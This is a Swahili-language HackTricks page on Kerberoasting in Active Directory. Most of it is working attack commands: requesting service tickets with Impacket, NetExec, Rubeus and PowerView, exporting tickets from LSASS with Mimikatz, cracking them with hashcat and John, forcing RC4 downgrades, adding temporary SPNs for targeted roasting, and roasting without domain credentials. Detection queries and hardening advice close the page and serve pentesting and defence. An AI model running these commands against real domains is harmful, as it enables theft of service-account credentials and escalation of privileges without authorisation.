# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting hulenga kupata tiketi za TGS, hasa zile zinazohusiana na huduma zinazoendeshwa chini ya akaunti za watumiaji katika Active Directory (AD), bila kujumuisha akaunti za kompyuta. Tiketi hizi husimbwa kwa kutumia funguo zinazotokana na nywila za watumiaji, hivyo kuruhusu kuvunja credentials bila kuunganishwa na mfumo. Akaunti ya mtumiaji inapotumika kama huduma, hilo huonyeshwa na sifa ya ServicePrincipalName (SPN) isiyo tupu.

Mtumiaji yeyote wa domain aliyejithibitisha anaweza kuomba tiketi za TGS, kwa hiyo hakuna ruhusa maalum zinazohitajika.<sup>[[4]](#references)[[5]](#references)</sup>

### Mambo Muhimu

- Hulenga tiketi za TGS za huduma zinazoendeshwa chini ya akaunti za watumiaji (yaani, akaunti zenye SPN iliyowekwa; si akaunti za kompyuta).
- Tiketi husimbwa kwa ufunguo unaotokana na nywila ya akaunti ya huduma na zinaweza kuvunjwa bila kuunganishwa na mfumo.
- Hakuna ruhusa za juu zinazohitajika; akaunti yoyote iliyojithibitisha inaweza kuomba tiketi za TGS.

> [!WARNING]
> Zana nyingi za umma hupendelea kuomba tiketi za huduma za RC4-HMAC (etype 23) kwa sababu ni rahisi kuzivunja kuliko AES. Hash za RC4 TGS huanza na `$krb5tgs$23$*`, za AES128 huanza na `$krb5tgs$17$*`, na za AES256 huanza na `$krb5tgs$18$*`. Hata hivyo, mazingira mengi yanahamia kwenye AES pekee. Usidhani kwamba RC4 pekee ndiyo muhimu.
> Pia, epuka kufanya Kerberoasting kwa mtindo wa “spray-and-pray”. Kerberoast ya chaguomsingi ya Rubeus inaweza kuuliza na kuomba tiketi za SPN zote, na hivyo kuacha dalili nyingi. Orodhesha na ulengeshe principal zinazovutia kwanza.

### Siri za akaunti za huduma na gharama ya kriptografia ya Kerberos

Huduma nyingi bado zinaendeshwa chini ya akaunti za watumiaji zenye nywila zinazosimamiwa kwa mikono. KDC husimba tiketi za huduma kwa funguo zinazotokana na nywila hizo na kutoa ciphertext kwa principal yoyote iliyojithibitisha, kwa hiyo kerberoasting huruhusu majaribio ya nywila bila kikomo nje ya mfumo, bila kufungiwa kwa akaunti au telemetry ya DC. Hali ya usimbaji huamua bajeti ya kuvunja nywila:

| Hali | Utoaji wa ufunguo | Aina ya usimbaji | Kasi ya takriban ya RTX 5090* | Maelezo |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 yenye marudio 4,096 na salt ya kila principal inayotokana na domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt huzuia rainbow tables lakini bado huruhusu kuvunjwa haraka kwa nywila fupi. |
| RC4 + NT hash | MD4 moja ya nywila (NT hash isiyo na salt); Kerberos huongeza tu confounder ya baiti 8 kwa kila tiketi | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~mara 1000 kasi zaidi kuliko AES; washambuliaji hulazimisha RC4 kila wakati `msDS-SupportedEncryptionTypes` inaporuhusu. |

*Vipimo vya kasi kutoka kwa Chick3nman kama vilivyonukuliwa katika [uchambuzi wa Kerberoasting wa Matthew Green](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Confounder ya RC4 hubadilisha tu keystream bila kuongeza kazi kwa kila jaribio. Isipokuwa akaunti za huduma zitumie siri nasibu (gMSA/dMSA, akaunti za mashine, au misururu inayosimamiwa na vault), kasi ya kuathiri akaunti hutegemea tu uwezo wa GPU. Kulazimisha etype za AES pekee huondoa uwezekano wa kushushwa hadi kasi ya makisio bilioni moja kwa sekunde, lakini nywila dhaifu zilizochaguliwa na watu bado zinaweza kuvunjwa kwa PBKDF2.<sup>[[3]](#references)</sup>

### Mashambulizi

#### Linux

Mfano wa vitendo wa hatua zote, unaotumia NetExec kuomba tiketi zinazoweza kuathiriwa na Hashcat kuzivunja, unapatikana katika rejeleo [1].<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Zana zenye vipengele vingi, ikijumuisha ukaguzi wa kerberoast:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Orodhesha watumiaji wanaoweza kulengwa kwa Kerberoast

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Mbinu 1: Omba TGS na dump kutoka kwenye kumbukumbu

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Mbinu ya 2: Zana za kiotomatiki

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> Ombi la TGS huzalisha Windows Security Event 4769 (Tiketi ya huduma ya Kerberos iliombwa).

### OPSEC na mazingira ya AES-only

- Omba RC4 kimakusudi kwa akaunti zisizo na AES:
  - Rubeus: `/rc4opsec` hutumia tgtdeleg kuorodhesha akaunti zisizo na AES na kuomba tiketi za huduma za RC4.
  - Rubeus: `/tgtdeleg` pamoja na kerberoast pia husababisha maombi ya RC4 inapowezekana.<sup>[[6]](#references)</sup>
- Fanya roast kwa akaunti za AES-only badala ya kushindwa kimyakimya:
  - Rubeus: `/aes` huorodhesha akaunti zilizo na AES na kuomba tiketi za huduma za AES (etype 17/18).
  - Ikiwa tayari una TGT (PTT au kutoka kwa .kirbi), unaweza kutumia `/ticket:<blob|path>` pamoja na `/spn:<SPN>` au `/spns:<file>` na kuruka LDAP.
- Kulenga, kupunguza kasi na kupunguza kelele:
  - Tumia `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` na `/jitter:<1-100>`.
  - Chuja akaunti zinazowezekana kuwa na manenosiri dhaifu kwa kutumia `/pwdsetbefore:<MM-dd-yyyy>` (manenosiri ya zamani) au lenga OUs zenye ruhusa za juu kwa kutumia `/ou:<DN>`.<sup>[[8]](#references)</sup>

Mifano (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### Kudumu / Matumizi Mabaya

Ikiwa unadhibiti au unaweza kurekebisha akaunti, unaweza kuifanya iwe kerberoastable kwa kuongeza SPN:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

Shusha kiwango cha akaunti ili kuwezesha RC4 kwa cracking rahisi (inahitaji ruhusa za kuandika kwenye object lengwa):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### Targeted Kerberoast kupitia GenericWrite/GenericAll kwenye user (SPN ya muda)

BloodHound inapoonyesha kuwa una udhibiti wa object ya user (k.m., GenericWrite/GenericAll), unaweza kwa uhakika kufanya “targeted-roast” ya user huyo mahususi hata kama kwa sasa hana SPN yoyote:<sup>[[9]](#references)</sup>

- Ongeza SPN ya muda kwa user unayemdhibiti ili aweze ku-roast.
- Omba TGS-REP iliyosimbwa kwa RC4 (etype 23) kwa SPN hiyo ili kurahisisha cracking.
- Crack hash ya `$krb5tgs$23$...` kwa kutumia hashcat.
- Ondoa SPN ili kupunguza footprint.

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linux one-liner (targetedKerberoast.py huendesha kiotomatiki kuongeza SPN -> kuomba TGS (etype 23) -> kuondoa SPN):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

Crack matokeo ukitumia autodetect ya hashcat (mode 13100 kwa `$krb5tgs$23$`):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

Vidokezo vya ugunduzi: kuongeza/kuondoa SPNs husababisha mabadiliko kwenye directory (Event ID 5136/4738 kwenye mtumiaji lengwa), na ombi la TGS huzalisha Event ID 4769. Zingatia kupunguza kasi ya maombi na kufanya usafishaji mara moja.

Unaweza kupata zana muhimu za mashambulizi ya kerberoast hapa: https://github.com/nidem/kerberoast

Ukipata hitilafu hii kwenye Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, inatokana na tofauti ya muda wa ndani. Sawazisha na DC:

- `ntpdate <DC_IP>` (imepitwa na wakati kwenye baadhi ya distros)
- `rdate -n <DC_IP>`

### Kerberoast bila akaunti ya domain (AS-requested STs)

Mnamo Septemba 2022, Charlie Clark alionyesha kwamba ikiwa principal haihitaji pre-authentication, inawezekana kupata service ticket kupitia KRB_AS_REQ iliyoundwa mahususi kwa kubadilisha sname kwenye mwili wa ombi, na hivyo kupata service ticket badala ya TGT. Hii ni sawa na AS-REP roasting na haihitaji vitambulisho halali vya domain.

Tazama maelezo: makala ya Semperis “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Lazima utoe orodha ya watumiaji kwa sababu bila vitambulisho halali huwezi kuuliza LDAP kwa kutumia mbinu hii.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

Vinavyohusiana

Ikiwa unalenga watumiaji wanaoweza kufanyiwa AS-REP roast, angalia pia:

{{#ref}}
asreproast.md
{{#endref}}

### Ugunduzi

Kerberoasting inaweza kufanyika kwa siri. Tafuta Event ID 4769 kutoka kwa DC na utumie vichujio kupunguza kelele:

- Ondoa jina la huduma `krbtgt` na majina ya huduma yanayoishia kwa `$` (akaunti za kompyuta).
- Ondoa maombi kutoka kwa akaunti za mashine (`*$$@*`).
- Maombi yaliyofaulu pekee (Failure Code `0x0`).
- Fuatilia aina za usimbaji fiche: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Usiweke arifa kwa `0x17` pekee.

Mfano wa triage ya PowerShell:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Mawazo ya ziada:

- Weka kiwango cha kawaida cha matumizi ya SPN kwa kila host/user; toa tahadhari kunapokuwa na ongezeko kubwa la maombi ya SPN tofauti kutoka kwa principal mmoja.
- Weka alama kwenye matumizi yasiyo ya kawaida ya RC4 katika domains zilizoimarishwa kwa AES.

### Kupunguza Hatari / Kuimarisha Usalama

- Tumia gMSA/dMSA au akaunti za mashine kwa huduma. Akaunti zinazosimamiwa zina nywila nasibu zenye vibambo 120+ na hubadilishwa kiotomatiki, hivyo kufanya kuzivunja nje ya mtandao kutowezekana kiutendaji.<sup>[[7]](#references)</sup>
- Lazimisha AES kwenye akaunti za huduma kwa kuweka `msDS-SupportedEncryptionTypes` iwe AES pekee (desimali 24 / heksadesimali 0x18), kisha ubadilishe nywila ili funguo za AES zitokane nayo.<sup>[[7]](#references)</sup>
- Inapowezekana, zima RC4 katika mazingira yako na ufuatilie majaribio ya kuitumia. Kwenye DCs unaweza kutumia thamani ya sajili ya `DefaultDomainSupportedEncTypes` kuelekeza mipangilio chaguomsingi kwa akaunti ambazo `msDS-SupportedEncryptionTypes` haijawekwa. Fanya majaribio ya kina.
- Ondoa SPNs zisizohitajika kwenye akaunti za watumiaji.<sup>[[7]](#references)</sup>
- Tumia nywila ndefu na nasibu kwa akaunti za huduma (vibambo 25+), ikiwa akaunti zinazosimamiwa haziwezekani; kataza nywila za kawaida na fanya ukaguzi mara kwa mara.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + kuvunja hashcat kwa vitendo](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Mashambulizi ya gharama ndogo ya kiteknolojia, athari kubwa kutoka kwa kripto ya zamani ya Kerberos (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Jinsi ya kushambulia Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Matumizi mabaya ya Active Directory Kerberos: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Kuomba TGS iliyosimbwa kwa RC4 wakati AES imewezeshwa](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Mwongozo wa Microsoft wa kusaidia kupunguza Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Hati za amri ya Rubeus kerberoast](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync hadi DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Njia mpya za mashambulizi? Tiketi za huduma zilizoombwa kama AS (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
